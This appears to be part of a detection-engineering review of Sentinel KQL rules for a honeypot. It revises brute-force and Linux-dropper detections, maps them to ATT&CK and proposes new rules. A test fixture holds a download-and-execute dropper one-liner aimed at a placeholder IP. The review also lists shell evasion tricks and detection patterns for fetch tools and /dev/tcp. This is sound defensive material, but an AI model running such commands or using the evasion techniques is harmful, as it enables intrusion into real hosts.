- **Split infrastructure.** The README reports that attackers "rotate infrastructure" and split the intrusion "across specialized bots". When the IP that guesses differs from the IP that logs in, this rule never fires. Correlate by account as well, and in the honeypot, alert on every real success (P1 below).
- **First-try or low-count success.** Leaked or default credentials used with fewer than 10 prior failures are missed. On an exposed honeypot this is the most likely real compromise path.
- **Linux is invisible.** This rule only reads SecurityEvent, and sshd success logs aren't collected (README, Limitations). Cowrie "successes" are fake by design.

### Tuning

1. **Filter both sides properly.** Exclude placeholder, loopback and analyst IPs. Keep only network logon types (3, 8, 10) ([4625 logon types][ev4625]; [logon types][logontypes]). Drop `ANONYMOUS LOGON` and machine accounts.
2. **Enforce order.** Count only failures in the 60 minutes *before* each success, using `between`, which takes datetime expressions ([between][between]). Failures are pre-bucketed per minute so the join stays small. One consequence is 1-minute granularity: a failure in the same minute as the success counts.
3. **Close the run-boundary gap.** Run every 10 minutes. Look at successes in the last 15 minutes (frequency + 5 minutes) and failures in the last 75 minutes (failure window + success window). Duplicate alerts across overlapping runs merge through alert grouping.
4. **Put the small table on the left of the join.** Microsoft recommends this for performance ([join][join]). Filter failures to the success IPs with `in` before aggregating ([best practices][bp]).
5. **Report whether the account that succeeded was one of the guessed ones,** and keep usernames in custom details, because Sentinel drops generic Account entity names ([entities reference][entref]).
6. **Pair it with P1**, "any real success not from the analyst". For the honeypot, P1 is the primary rule. This one is the production pattern.

**Revised KQL (untested — validate in workspace before deploying)**

```kql
// Brute force then success v2 -- untested — validate in workspace before deploying
// Sentinel: run every 10m, look back 75m. Severity: High.
let Lookback      = 75m;   // FailWindow + SuccessWindow
let SuccessWindow = 15m;   // frequency (10m) + 5m overlap; duplicates merge via alert grouping
let FailWindow    = 60m;   // failures must fall in the hour BEFORE the success
let MinFails      = 10;
let MyIP          = "<your-home-ip>";
let Successes = materialize(
    SecurityEvent
    | where TimeGenerated > ago(SuccessWindow)
    | where EventID == 4624
    | where LogonType in (3, 8, 10)                      // Network, NetworkCleartext, RemoteInteractive
    | where IpAddress !in ("", "-", "127.0.0.1", "::1", MyIP)
    | where TargetUserName !~ "ANONYMOUS LOGON" and TargetUserName !endswith "$"
    | project SuccessTime = TimeGenerated, Computer, IpAddress, LogonType,
              SuccessUser = tolower(TargetUserName), SuccessDomain = TargetDomainName);
let SuccessIPs = Successes | distinct IpAddress;
let FailMinutes = SecurityEvent
    | where TimeGenerated > ago(Lookback)
    | where EventID == 4625
    | where IpAddress in (SuccessIPs)
    | summarize Fails = count(), FailedUsers = make_set(tolower(TargetUserName), 50)
              by IpAddress, FailMinute = bin(TimeGenerated, 1m);
Successes
| join kind=inner (FailMinutes) on IpAddress
| where FailMinute between ((SuccessTime - FailWindow) .. SuccessTime)   // failures precede the success
| summarize Fails       = sum(Fails),
            FailedUsers = make_set(FailedUsers, 50),
            FirstFail   = min(FailMinute),
            LastFail    = max(FailMinute)
          by SuccessTime, Computer, IpAddress, LogonType, SuccessUser, SuccessDomain
| where Fails >= MinFails
| summarize FirstSuccess = min(SuccessTime),
            LogonTypes   = make_set(LogonType),
            Fails        = max(Fails),
            FailedUsers  = make_set(FailedUsers, 50),
            FirstFail    = min(FirstFail),
            LastFail     = max(LastFail)
          by IpAddress, Computer, SuccessUser, SuccessDomain
| extend SuccessUserWasGuessed = set_has_element(FailedUsers, SuccessUser),
         HostName              = tostring(split(Computer, ".")[0])
```

**Recommended Sentinel settings**

| Setting | Value |
| --- | --- |
| Run query every / Lookup data from the last | 10 min / 75 min |
| Alert threshold | Number of results > 0 |
| Event grouping | Trigger an alert for each event |
| Entity mapping | IP: Address = `IpAddress`; Host: HostName = `HostName`; Account: Name = `SuccessUser`, NTDomain = `SuccessDomain` |
| Custom details | `SuccessUser`, `Fails`, `FailedUsers`, `SuccessUserWasGuessed`, `LogonTypes` |
| Alert grouping | Enabled; group if IP and Account match; time frame 24 h; reopen closed incidents = Enabled (Azure portal only; not available after onboarding to the Defender portal ([scheduled rules][sched])) |
| ATT&CK | Credential Access T1110; Initial Access T1133; Defense Evasion/Persistence T1078 (T1078.001 / T1078.003) |
| Severity | High |
| NRT? | No. NRT rules capture only events ingested in the preceding minute ([NRT][nrt]), so they can't see a 60-minute failure history. My reading of the doc; not tested. NRT does suit P1. |

### Syntax and operator check

- **Good choice:** `join kind=inner` is explicit. The default kind, `innerunique`, deduplicates the *left* side ([join][join]), which would have kept only one success per IP.
- **Performance:** the large table (every 4624) is on the left and `suspects` on the right. Microsoft advises putting the smaller table on the left ([join][join]; [best practices][bp]). This doesn't matter at honeypot volume.
- **Bug:** no filter on `IpAddress` or `LogonType` (above).
- **Bug:** `ago(1h)` on both sides with a 1h/1h schedule leaves no overlap for chains that cross a run boundary ([scheduled rules][sched]).
- **OK:** `set_has_element` ([set_has_element][sethas]), `between` with datetime expressions ([between][between]), `make_set` over an array column, which flattens it ([make_set][mkset]), and `in` with a tabular `let` (the first column is used) ([in][incs]).

### Validation test (untested — validate in workspace before deploying)

```kql
// ORIGINAL logic with placeholder-IP data. Expected: 3 rows -- the bug (SYSTEM service logons reported as compromise).
// The revised rule's IP and LogonType filters should return 0 rows for the same input.
let T0 = datetime(2026-10-04 12:00:00);
let Fails = range i from 1 to 12 step 1
    | extend TimeGenerated = T0 + i * 1m, EventID = 4625, IpAddress = "-", Account = @"WORKGROUP\svc_backup", LogonType = 5;
let Succ = range i from 1 to 3 step 1
    | extend TimeGenerated = T0 + 30m + i * 1m, EventID = 4624, IpAddress = "-", Account = @"NT AUTHORITY\SYSTEM", LogonType = 5;
let Events = union Fails, Succ;
let suspects = Events
    | where EventID == 4625
    | summarize Fails = count() by IpAddress
    | where Fails >= 10;
Events
| where EventID == 4624
| join kind=inner suspects on IpAddress
| project TimeGenerated, Account, IpAddress, Fails
```

Other cases to build:

- 12 failures at 10:50–10:59 and a type-10 success at 11:01 from the same public IP: v1 misses it when run at 11:00 and 12:00; v2 alerts once.
- A success at 10:05 followed by 12 failures at 10:40: v1 alerts; v2 doesn't.

---

## Rule 5: Linux dropper pattern (`linux-dropper-pattern.kql`)

### What it detects

The rule flags a single Cowrie `cowrie.command.input` line that contains a fetch tool (`wget`, `curl`, `scp `, `tftp`), a world-writable path (`/tmp`, `/var/tmp`, `/dev/shm`) and an execution marker (`chmod +x`, `| sh`, `|sh`, `bash`, `nohup`, `./`).

**ATT&CK:** **T1105 Ingress Tool Transfer** and **T1059.004 Unix Shell**. `chmod +x` is also T1222.002 (Linux File and Directory Permissions Modification), `base64 -d` is T1140, and staging in a dot-folder is T1564.001. This mapping is my judgment, from MITRE ATT&CK.

### False positives and blind spots

**Honeypot context.** Every hit is an attacker, but Cowrie executes nothing. By Sentinel's severity definitions ([scheduled rules][sched]), an attempt typed into a fake shell is Low or Informational, not High. Its value is IOC harvesting.

**Production false positives** (if ported to EDR command lines): installer one-liners (`curl -fsSL https://get.docker.com | sh`), `wget … -O /tmp/x.sh && bash /tmp/x.sh` in provisioning, CI runners and config-management bootstraps that work in `/tmp`, and package post-install scripts. The bare terms `bash` and `./` are broad.

**Evasion and blind spots**

- **Multi-line chains.** *Judgment:* Cowrie logs one `cowrie.command.input` event per input line. If the README's "Fetch" stage (`auth_ok` beacon, hide in `/tmp`, `scp` with the bot's own key, delete everything) was typed as separate lines, no single line has all three parts.
- **Upload, then launch.** SFTP or SCP uploads are `cowrie.session.file_upload` events, not command input. The README's "Deliver" stage (payloads "uploaded and launched with `nohup` from hidden folders") is missed. That is how Panchan and the Mirai/Bashlite payloads arrived.
- **Obfuscation:** `w''get`, `${IFS}`, `$(printf …)`, hex escapes, base64-wrapped one-liners, and command names stored in variables.
- **Other fetchers:** python, perl or php one-liners, `nc`, bash `/dev/tcp/…` redirection, `busybox ftpget`, `lwp-download`.
- **Other execution forms:** `sh /tmp/x` (no pipe, no `bash` term, no `./`) and `. /tmp/x` (sourcing).
- **Other staging paths:** `/run/…`, `/var/run`, `$HOME/.x`, or the current directory.
- **Unclear matching semantics.** `has` and `has_any` match *terms*, which are maximal runs of alphanumeric characters. Terms shorter than 3 characters fall back to a column scan ([string operators][strops]; [has_any][hasany]). Learn doesn't say how an RHS with no alphanumeric term (`./`) or several terms plus punctuation (`| sh`, `chmod +x`, `scp ` with a trailing space) is matched. I can't confirm, for example, whether `"|sh"` matches `curl x|sh`. Use regex for punctuation-sensitive patterns.
- **Data gaps.**
  - `Cowrie_CL.TimeGenerated` may be the ingestion time (cross-cutting finding 4), which can blur ordering within a session.
  - Bots that fingerprint Cowrie abort before this stage (README).
  - The rule is Cowrie-specific. On real hosts you need process command lines: MDE `DeviceProcessEvents`, the ASIM process schema, or auditd `execve`. Syslog doesn't carry argv by default.

### Tuning

1. **Correlate per session, not per line.** Alert when a session contains a fetch (a download tool, `/dev/tcp`, or a Cowrie file transfer event) and an execution marker. If one line holds fetch, staging path and execution together, set `Confidence = High`; otherwise `Medium`.
2. **Count Cowrie transfer events as fetches** (`cowrie.session.file_upload` and `file_download`, as in `08-cowrie-file-captures.kql`). Pull the SHA-256 out of `message` with the regex 08 already uses, and map it to a FileHash entity.
3. **Use `matches regex` with `(?i)`** for punctuation-sensitive patterns. It is case-sensitive unless `(?i)` is set, and it allows at most 16 groups ([matches regex][mregex]; [regex syntax][regex]). The patterns below use 5 groups or fewer and avoid `&&`, which is a character-class intersection operator in KQL regex ([regex syntax][regex]).
4. **Add an explicit time filter and a schedule.** A 2-hour lookback with a 30-minute frequency means a fetch and a launch that straddle a run are still seen together.
5. **Exclude the analyst IP**, the way the hunting queries do.

**Revised KQL (untested — validate in workspace before deploying)**

```kql
// Linux dropper (Cowrie) v2 -- untested — validate in workspace before deploying
// Sentinel: run every 30m, look back 2h. Severity: honeypot Low (nothing executes in Cowrie); production port: High.
let Lookback = 2h;
let MyIP     = "<your-home-ip>";
let FetchRx  = @"(?i)\b(wget|curl|tftp|ftpget|scp|sftp)\b|/dev/tcp/";
let ExecRx   = @"(?i)chmod\s+[^;|]*(\+[rwst]*x|[0-7]{3,4})|\|\s*(ba|da|z)?sh\b|\b(ba|da|z)?sh\s+(-c\b|[^-\s])|\bnohup\b|(^|[\s;|(])\./|base64\s+-d";
let StageRx  = @"(/tmp|/var/tmp|/dev/shm|/run/|/var/run/|/\.[A-Za-z0-9_.-]+)";
Cowrie_CL
| where TimeGenerated > ago(Lookback)
| where src_ip != MyIP
| where eventid in ("cowrie.command.input", "cowrie.session.file_download", "cowrie.session.file_upload")
| extend IsCommand = eventid == "cowrie.command.input"
| extend Line = iff(IsCommand, input, message)
| extend IsFetch   = not(IsCommand) or Line matches regex FetchRx,
         IsExec    = IsCommand and Line matches regex ExecRx,
         IsStaging = Line matches regex StageRx
| summarize Fetches   = countif(IsFetch),
            Execs     = countif(IsExec),
            OneLiners = countif(IsCommand and IsFetch and IsExec and IsStaging),
            Transfers = countif(not(IsCommand)),
            Commands  = make_list_if(Line, IsCommand, 30),
            Sha256    = make_set_if(extract(@"([a-f0-9]{64})", 1, message), not(IsCommand), 10),
            FirstSeen = min(TimeGenerated),
            LastSeen  = max(TimeGenerated)
          by src_ip, session
| where Fetches > 0 and Execs > 0
| extend Confidence    = iff(OneLiners > 0, "High", "Medium"),
         FirstSha256   = tostring(Sha256[0]),
         HashAlgorithm = "SHA256"
```

**Recommended Sentinel settings**

| Setting | Value |
| --- | --- |
| Run query every / Lookup data from the last | 30 min / 2 h |
| Alert threshold | Number of results > 0 |
| Event grouping | Trigger an alert for each event (one per session) |
| Entity mapping | IP: Address = `src_ip`; FileHash: Algorithm = `HashAlgorithm`, Value = `FirstSha256`; Host only if `Cowrie_CL` has a `Computer` column (AMA fills it only when the table defines it ([AMA JSON logs][amajson])). Use `column_ifexists("Computer", "")` ([scheduled rules][sched]) |
| Custom details | `Confidence`, `Commands`, `Transfers`, `session` |
| Alert grouping | Enabled; group by IP; time frame 24 h |
| ATT&CK | Command and Control T1105; Execution T1059.004; Defense Evasion T1222.002 |
| Severity | Low in the honeypot (use Confidence in custom details); High when ported to real hosts |

### Syntax and operator check

- **Not verifiable from Microsoft docs:** `Cowrie_CL` is a custom table. Its columns (`eventid`, `input`, `src_ip`, `session`, `message`) are consistent with hunting queries 04–09, but confirm them with `Cowrie_CL | getschema`.
- **Issue:** the matching semantics of `has_any` for punctuation-only or multi-term values aren't documented (above). The terms `sh` and `./` fall below the 3-character term-index minimum, so they force a scan ([string operators][strops]). Cowrie volume is tiny, so the performance cost doesn't matter.
- **Issue:** no time filter, and no schedule, lookback or severity in the header. The header calls it a "Hunting query"; the README calls it a High-severity detection.
- **OK:** `matches regex` with RE2-style syntax, `(?i)` and `\b` ([regex syntax][regex]); `make_list_if` and `make_set_if` ([make_list_if][mklistif]; [make_set_if][mksetif]); `countif` ([countif][countif]).

### Validation test (untested — validate in workspace before deploying)

Replace `Cowrie_CL | where TimeGenerated > ago(Lookback)` in the revised query with `Cowrie_Test` defined below. The upload `message` format is synthetic; check it against a real `cowrie.session.file_upload` row.

```kql
let Cowrie_Test = datatable(TimeGenerated: datetime, src_ip: string, session: string, eventid: string, input: string, message: string) [
    datetime(2026-10-04 03:00:00), "198.51.100.1", "s1", "cowrie.command.input", "cd /tmp; wget http://203.0.113.5/a; chmod +x a; ./a", "",
    datetime(2026-10-04 03:01:00), "198.51.100.2", "s2", "cowrie.session.file_upload", "", "Uploaded sshd sha256 94f2e4d8d4436874785cd14e6e6d403507b8750852f7f2040352069a75da4c00",
    datetime(2026-10-04 03:01:30), "198.51.100.2", "s2", "cowrie.command.input", "nohup ./sshd &", "",
    datetime(2026-10-04 03:02:00), "198.51.100.3", "s3", "cowrie.command.input", "uname -a; cat /proc/cpuinfo", ""
];
Cowrie_Test
| take 10
```

| Session | v1 expected | v2 expected |
| --- | --- | --- |
| s1, one-liner | match | alert, Confidence = High |
| s2, upload then `nohup` | no match | alert, Confidence = Medium, FileHash 94f2… |
| s3, recon only | no match | no alert |

---

## README claims vs. code

The README's detections table (lines 120–126) has **Logic** and **Severity** columns. It makes no confidence claims, so I compared logic and severity.

| Rule | README claim | What the KQL does | Verdict |
| --- | --- | --- | --- |
| RDP brute force | 10+ failed logons from one IP in 5 minutes; Medium | ≥ 10 failures (4625) per IP per *clock-aligned* 5-minute bin, truncated by a 5-minute run window that isn't aligned; includes `-` as a "source"; header says Medium | **Mismatch.** "In 5 minutes" is really "in one aligned bin, partially visible per run". Severity matches. |
| Low-and-slow | 20+ failures across 3+ separate hours at under 2 per minute; Medium | Attempts ≥ 20, ≥ 3 distinct clock-hour buckets, *average* rate over the first-to-last span < 2/min; Medium | **Numbers match. Meaning differs:** 3 clock hours can be 61 minutes, and "under 2 per minute" is an average, not a ceiling. Severity matches. |
| Password spraying | 20+ usernames from one IP in 10 minutes, under 3 guesses each; Medium | `dcount(Account)` ≥ 20 per aligned 10-minute bin, average attempts per account < 3 (integer division); Medium | **Numbers match.** "Each" is an average. `Account` includes the domain. The source the header cites (~7 per name) may not satisfy it. Severity matches. |
| Brute force then success | A successful logon from an IP with 10+ recent failures; High | Any 4624 in the last hour from an IP with ≥ 10 failures in the same hour; no ordering; no IP or logon-type filter; High | **Mismatch.** "Recent" isn't enforced as "before the success", and placeholder IPs match. Severity matches. |
| Linux dropper | Download tool + world-writable path + execute in one command; High | Three `has_any` clauses on one `cowrie.command.input` line; header says "Hunting query"; no schedule or severity | **Logic matches. Status and severity don't** (no severity in the file; High is too high for a fake shell). |
| README line 128 | "the two rate rules now split the work with no overlap" | See Rules 1–2 | **Not guaranteed either way.** A gap (2–4/min, depending on phase) and overlap (bursty sources) both follow from the logic. The rule comment says it held on Oct 3–5; I didn't re-check that. |
| README line 128 | v1 "missed an attacker making one guess every 12 minutes" | Header: "v1 … missed a 38-attempt / 7.5-hour source" (7.5 h / 38 ≈ 11.8 min) | **Consistent.** v2 does catch that profile. |

---

## Coverage summary

**Definitions**

- **Covered:** a scheduled rule in `queries/detections/` fires on the README's own cited evidence for the technique.
- **Partial:** a scheduled rule covers part of the behavior but misses the cited evidence or a major variant.
- **Hunting-only:** only a hunting query surfaces it.
- **None:** nothing does.

**Hunting is not detection.** The 14 hunting queries help an analyst who runs them. They raise no alerts, and nothing happens when they would have returned rows.

| Technique | README evidence | Status | Rule / query | What's missing |
| --- | --- | --- | --- | --- |
| T1595.001 Scanning IP Blocks | Sub-second port probes; Nmap/ZGrab banners | Hunting-only | `10-endlessh-tarpit.kql` (indirect: every tarpit connection is an unsolicited probe) | No flow telemetry (VNet flow logs) and no rule. Port spread and banners aren't captured. |
| T1592 Gather Victim Host Information | Usernames built from the VM's hostname | Hunting-only | `03-rdp-top-usernames.kql` (indirect, by eye) | The recon itself happens on the attacker's side. No rule flags usernames derived from the hostname. |
| T1110.001 Password Guessing | 783,667 attempts from one IP in 3 h | **Covered** | `rdp-bruteforce`, `low-and-slow-bruteforce` | RDP only. SSH guessing against Cowrie (5,113 attempts) has no rule, and the bin-split gap lets 2–4/min sources slip between the two rules. |
| T1110.003 Password Spraying | 5,054 usernames, ~7 guesses each, from one Hetzner server | Partial | `password-spray` | Per IP only, RDP only. The ratio cap may exclude the cited source, and bin edges split sprays. |
| T1078.001 Default Accounts | `Guest`, `DefaultAccount`, `admin` with an empty password | Partial | `bruteforce-then-success` (only if a default account succeeds after ≥ 10 failures from the same IP); hunting `02`, `06`, `14` | No rule for a real success without prior failures, for Cowrie accepting default credentials, or for sshd (auth logs aren't collected). |
| T1059.004 Unix Shell | One-line bash droppers | **Covered** (if scheduled) | `linux-dropper-pattern` | Only download-and-execute in one line, and the file gives no schedule. Other shell activity is visible only in `07`. |
| T1082 System Information Discovery | `uname -a`, CPU/GPU checks | Hunting-only | `07-cowrie-commands.kql` | No rule. |
| T1497.001 System Checks | `echo "xxxxxx"` honeypot test | Hunting-only | `07` (command), `08` (probe-script hash) | No rule, and the probe hash isn't in a watchlist. |
| T1105 Ingress Tool Transfer | `scp`/`wget`/`curl` fetches; SFTP uploads | Partial | `linux-dropper-pattern`; hunting `08` | SFTP/SCP uploads (`file_upload`) and fetches without execution on the same line are missed. |
| T1036.005 Masquerading | Malware named `sshd` | Hunting-only | `07` (`./sshd` launches), `08` (hash) | No rule for binaries named like system daemons in writable paths. |
| T1564.001 Hidden Files and Directories | Dot-folders in `/tmp` | Hunting-only | `07` | The dropper rule matches `/tmp` but not dot-folders specifically. No rule. |
| T1070.004 File Deletion | `rm -rf sshcfg key.ppk out_sh` | Hunting-only | `07` | No rule. |
| T1496 Resource Hijacking | Panchan crypto miner | None | (none; `08` only lets you identify the miner by hash offline) | Cowrie never runs payloads. Detecting this needs CPU, process and network telemetry from a real host. |

**Totals:** 2 covered, 3 partial, 8 none (no scheduled detection): 7 hunting-only and 1 with nothing.

### Recommended new detections (prioritized)

All KQL below is **untested — validate in workspace before deploying**. It uses only tables that exist in this lab (`SecurityEvent`, `Cowrie_CL`, `Syslog`), plus the columns the hunting queries already use.

**P1: Any real successful remote logon not from the analyst** (T1078, T1078.001/.003, T1133). In a honeypot this is the only "you are actually breached" signal, so it should be High and near-real-time. It's a single-event rule, so it suits NRT: runs every minute, 2-minute delay, at most 50 NRT rules per workspace ([NRT][nrt]). The Linux half requires adding `auth`/`authpriv` to the Syslog DCR, which the README says isn't done yet ([Syslog via AMA][syslogama]). On OpenSSH 9.8 and later the process may log as `sshd-session`, hence `startswith`.

```kql
// P1 -- untested — validate in workspace before deploying. NRT (or scheduled 5m/10m). Severity: High.
let MyIP = "<your-home-ip>";
let DefaultNames = dynamic(["guest", "defaultaccount", "administrator", "admin", "root", "ubnt", "pi", "user", "test"]);
union
  (SecurityEvent
   | where EventID == 4624 and LogonType in (3, 8, 10)
   | where IpAddress !in ("", "-", "127.0.0.1", "::1", MyIP)
   | where TargetUserName !~ "ANONYMOUS LOGON" and TargetUserName !endswith "$"
   | project TimeGenerated, Sensor = "Windows", Computer, IpAddress, Account = TargetUserName),
  (Syslog
   | where Facility in ("auth", "authpriv") and ProcessName startswith "sshd" and SyslogMessage has "Accepted"
   | extend IpAddress = extract(@"from (\S+) port", 1, SyslogMessage),
            Account   = extract(@"for (\S+) from", 1, SyslogMessage)
   | where IpAddress != MyIP
   | project TimeGenerated, Sensor = "Linux sshd", Computer, IpAddress, Account)
| extend IsDefaultAccount = tolower(Account) in (DefaultNames)
```

If you run P1 as a scheduled rule instead of NRT, add `| where TimeGenerated > ago(10m)` to each branch.

**P2: Sensor went silent** (operational; it protects every other rule).

```kql
// P2 -- untested — validate in workspace before deploying. Scheduled 15m / 1h. Severity: Medium.
// Endlessh can be quiet legitimately; tune Silence for that source.
let Silence = 30m;
union
  (SecurityEvent | where TimeGenerated > ago(1h) | summarize LastSeen = max(TimeGenerated) | extend Source = "Windows SecurityEvent"),
  (Cowrie_CL     | where TimeGenerated > ago(1h) | summarize LastSeen = max(TimeGenerated) | extend Source = "Cowrie_CL"),
  (Syslog        | where TimeGenerated > ago(1h) and ProcessName == "endlessh"
                 | summarize LastSeen = max(TimeGenerated) | extend Source = "Endlessh Syslog")
| where isnull(LastSeen) or LastSeen < ago(Silence)
```

A `summarize` with no group keys always returns one row, and `max()` over empty input is null ([summarize][summ]). That's why a silent source still produces a row here.

**P3: SSH guessing and spraying against Cowrie, plus default-credential acceptance** (T1110.001, T1110.003, T1078.001). Credential parsing reuses `06-cowrie-credentials.kql`.

```kql
// P3 -- untested — validate in workspace before deploying. Scheduled 15m / 1h. Severity: Low (honeypot).
let Lookback     = 1h;
let MinAttempts  = 10;
let MyIP         = "<your-home-ip>";
let DefaultUsers = dynamic(["root", "admin", "administrator", "guest", "user", "test", "ubnt", "pi", "support", "oracle"]);
Cowrie_CL
| where TimeGenerated > ago(Lookback)
| where eventid startswith "cowrie.login" and src_ip != MyIP
| extend creds = extract(@"\[(.*)\]", 1, message)
| extend User = tostring(split(creds, "/")[0]), Pass = tostring(split(creds, "/")[1])
| summarize Attempts        = count(),
            Users           = dcount(User),
            Passwords       = dcount(Pass),
            Accepted        = countif(eventid == "cowrie.login.success"),
            DefaultAccepted = countif(eventid == "cowrie.login.success" and (tolower(User) in (DefaultUsers) or isempty(Pass))),
            AcceptedCreds   = make_set_if(creds, eventid == "cowrie.login.success", 10),
            FirstSeen       = min(TimeGenerated),
            LastSeen        = max(TimeGenerated)
          by src_ip
| where Attempts >= MinAttempts or DefaultAccepted > 0
| extend Pattern = case(Users >= 20 and todouble(Attempts) / Users < 3, "spray (T1110.003)",
                        Attempts >= MinAttempts, "guessing (T1110.001)",
                        "default credentials accepted (T1078.001)")
```

**P4: Known-bad file hashes** (T1105 delivery, the T1496 payload, and the T1497.001 probe). Move the README's IOCs into a watchlist; they're inline here for brevity. This is an IOC rule, so it ages out, but the README rates these hashes high-confidence.

```kql
// P4 -- untested — validate in workspace before deploying. Scheduled 30m / 1h. Severity: Medium.
let IocHashes = dynamic([
    "94f2e4d8d4436874785cd14e6e6d403507b8750852f7f2040352069a75da4c00",   // Panchan miner disguised as sshd
    "941efe52eb858311653bf2c1e855555cf735896d500f11ea90aaf7e93d1faa3f",   // Mirai ARM ELF
    "586960df8bf559ffbba600f11917a99baed4a875cb7faa5eabc060bcde67277b",   // Bashlite loader
    "af77b643964afd794460d28ab8a11b0ec8790cd5463abfde126613a4f3bccd32"]); // honeypot-probe script
Cowrie_CL
| where TimeGenerated > ago(1h)
| where eventid has_any ("file_upload", "file_download")
| extend sha256 = extract(@"([a-f0-9]{64})", 1, message)
| where sha256 in (IocHashes)
| project TimeGenerated, src_ip, session, eventid, sha256, message
```

**P5: Post-login reconnaissance and honeypot checks in one session** (T1082, T1497.001).

```kql
// P5 -- untested — validate in workspace before deploying. Scheduled 30m / 2h. Severity: Low.
let Lookback  = 2h;
let MyIP      = "<your-home-ip>";
let ProbeHash = "af77b643964afd794460d28ab8a11b0ec8790cd5463abfde126613a4f3bccd32";
Cowrie_CL
| where TimeGenerated > ago(Lookback) and src_ip != MyIP
| where eventid == "cowrie.command.input" or eventid has_any ("file_upload", "file_download")
| extend IsCommand = eventid == "cowrie.command.input"
| extend IsDiscovery = IsCommand and input matches regex @"(?i)\b(uname|lscpu|nproc|uptime|whoami|hostname|lspci|nvidia-smi|dmidecode)\b|/proc/(cpuinfo|meminfo|version)",
         IsHoneypotCheck = (IsCommand and input matches regex @'echo\s+"?x{4,}') or message has ProbeHash
| summarize DiscoveryCmds  = countif(IsDiscovery),
            HoneypotChecks = countif(IsHoneypotCheck),
            Commands       = make_list_if(input, IsCommand, 30),
            FirstSeen      = min(TimeGenerated)
          by src_ip, session
| where DiscoveryCmds >= 3 or HoneypotChecks > 0
```

**P6: Evasion artifacts: hidden staging directories, cleanup, and system-daemon names** (T1564.001, T1070.004, T1036.005). In production, `/tmp/.X11-unix` and `/tmp/.ICE-unix` are legitimate; exclude them if you port this.

```kql
// P6 -- untested — validate in workspace before deploying. Scheduled 30m / 2h. Severity: Low.
let Lookback = 2h;
let MyIP     = "<your-home-ip>";
Cowrie_CL
| where TimeGenerated > ago(Lookback) and src_ip != MyIP
| where eventid == "cowrie.command.input"
| extend Hidden     = input matches regex @"(/tmp|/var/tmp|/dev/shm|~|\$HOME)/\.[A-Za-z0-9_][^/\s;|]*",
         Deletion   = input matches regex @"\brm\s+(-[a-zA-Z]*[rf][a-zA-Z]*\s+)+",
         Masquerade = input matches regex @"(\./|/tmp/\S*|/var/tmp/\S*|/dev/shm/\S*)\b(sshd|systemd|kworker|kthreadd|crond|cron|init|dbus-daemon|rsyslogd)\b"
| summarize HiddenCmds     = countif(Hidden),
            DeletionCmds   = countif(Deletion),
            MasqueradeCmds = countif(Masquerade),
            Commands       = make_list(input, 30),
            FirstSeen      = min(TimeGenerated)
          by src_ip, session
| where MasqueradeCmds > 0 or (HiddenCmds > 0 and DeletionCmds > 0)
```

**P7: One source probing two or more exposed services within an hour.** This is a proxy for T1595.001 built from the existing sensors.

```kql
// P7 -- untested — validate in workspace before deploying. Scheduled 1h / 1h. Severity: Informational.
let Lookback = 1h;
let MyIP     = "<your-home-ip>";
union
  (SecurityEvent
   | where TimeGenerated > ago(Lookback) and EventID == 4625 and IpAddress !in ("", "-", "127.0.0.1", "::1")
   | project TimeGenerated, IP = IpAddress, Service = "RDP/3389"),
  (Cowrie_CL
   | where TimeGenerated > ago(Lookback) and isnotempty(src_ip)
   | project TimeGenerated, IP = src_ip, Service = "SSH/22 (Cowrie)"),
  (Syslog
   | where TimeGenerated > ago(Lookback) and ProcessName == "endlessh" and SyslogMessage has "CLOSE"
   | extend IP = extract(@"host=(?:::ffff:)?([0-9\.]+)", 1, SyslogMessage)
   | project TimeGenerated, IP, Service = "SSH/2222 (Endlessh)")
| where IP != MyIP
| summarize Services = dcount(Service), ServiceList = make_set(Service), Events = count(),
            FirstSeen = min(TimeGenerated), LastSeen = max(TimeGenerated)
          by IP
| where Services >= 2
```

Real scan detection (many ports, SYN patterns) needs **VNet flow logs with traffic analytics**, which write to `NTANetAnalytics`. NSG flow logs no longer accept new configurations and retire on September 30, 2027 ([NSG flow logs][nsgfl]). The `NTANetAnalytics` table name comes from a Microsoft Q&A answer; I didn't fetch the table reference page. If Cowrie's `cowrie.client.version` events are ingested (check with `Cowrie_CL | distinct eventid`), client banners such as ZGrab, Go and libssh give a second signal.

**P8: Guessed usernames derived from the target hostname** (T1592, inferred from how the information is used). The reconnaissance itself happens on the attacker's side, from the RDP/NTLM exposure of the hostname, and leaves no telemetry here.

```kql
// P8 -- untested — validate in workspace before deploying. Scheduled 1h / 1h. Severity: Informational.
let Lookback = 1h;
SecurityEvent
| where TimeGenerated > ago(Lookback)
| where EventID == 4625 and IpAddress !in ("", "-", "127.0.0.1", "::1")
| extend HostShort = tolower(tostring(split(Computer, ".")[0])), User = tolower(TargetUserName)
| where strlen(User) >= 4 and (indexof(User, HostShort) >= 0 or indexof(HostShort, User) >= 0)
| summarize Attempts = count(), Users = make_set(User, 20), FirstSeen = min(TimeGenerated) by IpAddress, Computer
```

`indexof()` is case-sensitive and returns -1 when there's no match, hence the `tolower()` on both sides ([indexof()][indexof]).

**T1496 Resource Hijacking can't be detected with current telemetry.** Cowrie executes nothing, so no hijacking ever occurs. On a real host you would need:

- host performance counters through AMA or VM insights (sustained CPU);
- process telemetry (MDE `DeviceProcessEvents`, or auditd `execve` through Syslog);
- network telemetry to mining pools (VNet flow logs, DNS logs).

In the honeypot, miner-like command lines (`xmrig`, `stratum+tcp`, `--donate-level`) in `Cowrie_CL.input` would show only intent. Panchan was launched as `./sshd`, so even that wouldn't have matched.

---

## Verification notes

**None of the KQL in this document was executed.** I had no workspace and no data. The Oct 3–5 results quoted from the README and the rule comments weren't re-verified.

### Confirmed against Microsoft Learn

| Claim | Source |
| --- | --- |
| SecurityEvent has `EventID` (int), `IpAddress`, `IpPort`, `Account`, `TargetUserName`, `TargetDomainName`, `LogonType` (int), `Status`, `SubStatus` (string), `Computer` and `WorkstationName`; `Account` is described only as "security context" | https://learn.microsoft.com/en-us/azure/azure-monitor/reference/tables/securityevent |
| 4625 fields and XML (`TargetUserName` = the account specified in the attempt; `IpAddress` = Source Network Address); the logon type table; IPv6 or `::ffff:` IPv4 addresses, with `::1`/`127.0.0.1` meaning localhost; SubStatus `0xC0000064` (bad username) and `0xC000006A` (bad password); subcategories Audit Logon and Audit Account Lockout | https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4625 |
| Remote Desktop success = RemoteInteractive; RD Gateway and vulnerability scanners use Network logons | https://learn.microsoft.com/en-us/windows-server/identity/securing-privileged-access/reference-tools-logon-types |
| 4624 and 4625 are in both the Minimal and Common event sets; the connector collects only the Security and AppLocker channels | https://learn.microsoft.com/en-us/azure/sentinel/windows-security-event-id-reference |
